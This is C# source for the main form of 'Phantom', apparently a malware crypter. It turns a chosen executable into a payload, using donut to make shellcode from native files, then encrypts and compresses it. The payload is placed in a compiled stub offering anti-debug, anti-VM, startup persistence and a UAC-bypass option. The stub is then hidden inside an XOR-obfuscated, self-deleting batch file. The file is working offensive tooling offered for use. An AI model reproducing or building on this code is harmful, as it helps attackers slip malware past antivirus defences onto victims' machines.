using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet;
using Microsoft.CSharp;
using Phantom.Properties;
using static Phantom.Utils;

namespace Phantom
{
    public partial class PhantomMain : Form
    {
        public PhantomMain()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e) // I actually fucking hate how hes checking the update thing so i commented the whole thing out its at the bottom
        {
            SettingsObject obj = Settings.Load();
            if (obj != null)
            {
                UnpackSettings(obj);
            }
            //Task.Factory.StartNew(CheckVersion);
            UpdateKeys();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(PackSettings());
            Environment.Exit(-1);
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = @"Executable Files (*.exe)|*.exe";
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            textBox1.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e) => Crypt();

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = @"Executable/Batch Files (*.exe, *.bat)|*.exe;*.bat";
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            listBox1.Items.Add(ofd.FileName);
        }

        private static string CreateTempFile(Random rng)
        {
            string tempfilename = Utils.RandomString(10, rng) + @".tmp";
            File.WriteAllText(tempfilename, @"");
            return tempfilename;
        }

        private static byte[] ExtractResource(String filename)
        {
            System.Reflection.Assembly a = System.Reflection.Assembly.GetExecutingAssembly();
            using (Stream resFilestream = a.GetManifestResourceStream(filename))
            {
                if (resFilestream == null) return null;
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }
        }

        private void removeFile_Click(object sender, EventArgs e)
        {
            listBox1.Items.Remove(listBox1.SelectedItem);
        }

        internal enum FileType
        {
            x64,
            x86,
            NET64,
            NET86,
            Invalid
        }

        private static FileType GetFileType(string path)
        {
            FileType result;
            try
            {
                result = ((AssemblyName.GetAssemblyName(path).ProcessorArchitecture == ProcessorArchitecture.X86) ? FileType.NET86 : FileType.NET64);
            }
            catch
            {
                using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read))
                {
                    using (BinaryReader binaryReader = new BinaryReader(fileStream))
                    {
                        try
                        {
                            fileStream.Seek(60L, SeekOrigin.Begin);
                            int num = binaryReader.ReadInt32();
                            fileStream.Seek((long)num, SeekOrigin.Begin);
                            bool flag = binaryReader.ReadUInt32() != 17744U;
                            if (flag)
                            {
                                throw new Exception();
                            }
                            result = ((binaryReader.ReadUInt16() == 332) ? FileType.x86 : FileType.x64);
                        }
                        catch
                        {
                            result = FileType.Invalid;
                        }
                    }
                }
            }
            return result;
        }

        // Method to create a crypted batch file from an executable
        private void Crypt()
        {
            buildButton.Enabled = false;
            tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
            listBox2.Items.Clear();

            #region Initialization
            var keys = UpdateKeys();
            var stubKeys = UpdateKeys();
            Random rng = new Random();
            string inputPath = textBox1.Text;

            byte[] key = keys.key, iv = keys.iv, stubKey = stubKeys.key, stubIv = stubKeys.iv;
            EncryptionMode mode = EncryptionMode.AES;

            if (!File.Exists(inputPath) || Path.GetExtension(inputPath) != ".exe")
            {
                MessageBox.Show(!File.Exists(inputPath) ? "Invalid input path." : "Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            #endregion

            #region Payload Processing
            byte[] payloadBytes = File.ReadAllBytes(inputPath);
            bool isNetAssembly = false;

            FileType fileType = GetFileType(inputPath);
            if (fileType == FileType.Invalid)
            {
                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            else if (fileType == FileType.NET64 || fileType == FileType.NET86)
            {
                isNetAssembly = true;
            }

            if (!isNetAssembly)
            {
                listBox2.Items.Add("[Native Payload Detected] - Converting payload to shellcode...");
                int archType = fileType == FileType.x64 ? 2 : 1;

                string payloadExtension = Path.GetExtension(inputPath);
                string nativePayloadPath = $"payload_native{payloadExtension}";
                File.WriteAllBytes(nativePayloadPath, payloadBytes);
                File.WriteAllBytes("donut.exe", ExtractResource("Phantom.Resources.donut.exe"));

                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = "cmd.exe",
                    Arguments = $"/C donut.exe -a {archType} -o \"payload_native.bin\" -i \"{nativePayloadPath}\" -b 1 -k 2 -x 3 & exit"
                };

                Process.Start(processStartInfo).WaitForExit();

                File.Delete("donut.exe");
                File.Delete(nativePayloadPath);

                payloadBytes = File.ReadAllBytes("payload_native.bin");
                File.Delete("payload_native.bin");
            }
            #endregion

            #region Encryption and Stub Creation
            listBox2.Items.Add("Encrypting payload...");
            byte[] encryptedPayload = Encrypt(mode, Compress(payloadBytes), stubKey, stubIv);

            listBox2.Items.Add("Creating stub...");
            string stub = StubGen.CreateCS(stubKey, stubIv, mode, antiDebug.Checked, antiVM.Checked, startup.Checked, uacBypass.Checked, !isNetAssembly, rng);

            listBox2.Items.Add("Building stub...");
            string tempFile = Path.GetTempFileName(); // Use a proper temporary file
            File.WriteAllBytes("payload.exe", encryptedPayload);

            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll", "System.Windows.Forms.dll" }, tempFile)
            {
                GenerateExecutable = true,
                CompilerOptions = "-optimize -unsafe",
                IncludeDebugInformation = false
            };

            parameters.EmbeddedResources.Add("payload.exe");
            if (uacBypass.Checked)
            {
                string uacResource = fileType == FileType.NET64 || fileType == FileType.x64 ? "Phantom.Resources.UAC64.dll" : "Phantom.Resources.UAC.dll";
                File.WriteAllBytes("UAC", Compress(ExtractResource(uacResource)));
                parameters.EmbeddedResources.Add("UAC");
            }

            foreach (string item in listBox1.Items)
            {
                parameters.EmbeddedResources.Add(item);
            }

            CompilerResults results = new CSharpCodeProvider().CompileAssemblyFromSource(parameters, stub);
            if (results.Errors.Count > 0)
            {
                CleanupFiles(new[] { "payload.exe", tempFile, "UAC" });
                MessageBox.Show("Stager Stub build error!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }

            byte[] stubBytes = File.ReadAllBytes(tempFile);
            CleanupFiles(new[] { "payload.exe", tempFile, "UAC" });
            #endregion

            #region Final Encryption and Batch File Creation
            listBox2.Items.Add("Encrypting stub...");
            byte[] encryptedStub = Encrypt(mode, Compress(stubBytes), key, iv);

            listBox2.Items.Add("Creating batch file...");
            string batchContent = FileGen.CreateBat(key, iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, fileType, rng);
            List<string> contentLines = new List<string>(batchContent.Split(new[] { Environment.NewLine }, StringSplitOptions.None));

            contentLines.Insert(rng.Next(0, contentLines.Count), $":: {Convert.ToBase64String(encryptedStub)}");
            batchContent = string.Join(Environment.NewLine, contentLines);
            batchContent = Obfuscator.GenerateXorBatchScript(batchContent, rng);

            SaveFileDialog sfd = new SaveFileDialog
            {
                AddExtension = true,
                DefaultExt = "bat",
                Title = "Save File",
                Filter = "Batch files (*.bat)|*.bat",
                RestoreDirectory = true,
                FileName = Path.ChangeExtension(inputPath, "bat")
            };

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                listBox2.Items.Add("Writing output...");
                File.WriteAllText(sfd.FileName, batchContent, Encoding.ASCII);
                MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            #endregion

            buildButton.Enabled = true;
        }

        #region Helper Methods
        private void CleanupFiles(string[] files)
        {
            foreach (string file in files)
            {
                if (File.Exists(file))
                {
                    File.Delete(file);
                }
            }
        }
        #endregion

        private (byte[] key, byte[] iv) UpdateKeys()
        {
            using (var tin = Aes.Create())
            {
                tin.GenerateKey();
                tin.GenerateIV();
                return (tin.Key, tin.IV);
            }
        }

        private void UnpackSettings(SettingsObject obj)
        {
            listBox2.Items.Add("Unpacking settings...");

            textBox1.Text = obj.inputFile;
            antiDebug.Checked = obj.antiDebug;
            antiVM.Checked = obj.antiVM;
            selfDelete.Checked = obj.selfDelete;
            hidden.Checked = obj.hidden;
            runas.Checked = obj.runas;
            startup.Checked = obj.startup;
            uacBypass.Checked = obj.uacBypass;

            if (obj.bindedFiles != null && obj.bindedFiles.Length > 0)
            {
                try
                {
                    listBox1.Items.AddRange(obj.bindedFiles);
                }
                catch (Exception ex)
                {
                    listBox2.Items.Add($"Exception : {ex.Message}");
                }
            }
            else
            {
                listBox2.Items.Add("No binded files.");
            }
        }


        private SettingsObject PackSettings()
        {
            return new SettingsObject
            {
                inputFile = textBox1.Text,
                antiDebug = antiDebug.Checked,
                antiVM = antiVM.Checked,
                selfDelete = selfDelete.Checked,
                hidden = hidden.Checked,
                runas = runas.Checked,
                startup = startup.Checked,
                uacBypass = uacBypass.Checked,
                bindedFiles = listBox1.Items.Cast<string>().ToArray()
            };
        }

        private void startup_CheckedChanged(object sender, EventArgs e)
        {
            if (startup.Checked)
            {
                selfDelete.Checked = false;
                selfDelete.Enabled = false;
            }
            else
            {
                if (!uacBypass.Checked)
                {
                    selfDelete.Enabled = true;
                }
            }
        }

        private void uacBypass_CheckedChanged(object sender, EventArgs e)
        {
            if (uacBypass.Checked)
            {
                if (runas.Checked)
                {
                    runas.Checked = false;
                }
                selfDelete.Checked = false;
                selfDelete.Enabled = false;
            }
            else
            {
                if (!startup.Checked)
                {
                    selfDelete.Enabled = true;
                }
            }
        }

        private void runas_CheckedChanged(object sender, EventArgs e)
        {
            if (runas.Checked)
            {
                if (uacBypass.Checked)
                {
                    uacBypass.Checked = false;
                }
            }
        }

        /*
         * You dont understand how much this makes me mad 
         * 
        private void CheckVersion()
        {
            try
            {
                WebClient wc = new WebClient();
                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/C5Hackr/Phantom/main/version").Trim();
                wc.Dispose();
                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
                {
                    string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
                    if (currentversion != latestversion)
                    {
                        DialogResult result = MessageBox.Show($"Phantom {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
                        if (result == DialogResult.Yes)
                        {
                            Process.Start("https://github.com/C5Hackr/Phantom/releases/tag/" + latestversion);
                        }
                    }
                }
                File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion", latestversion);
            }
            catch
            {
            }
        }*/
    }
}
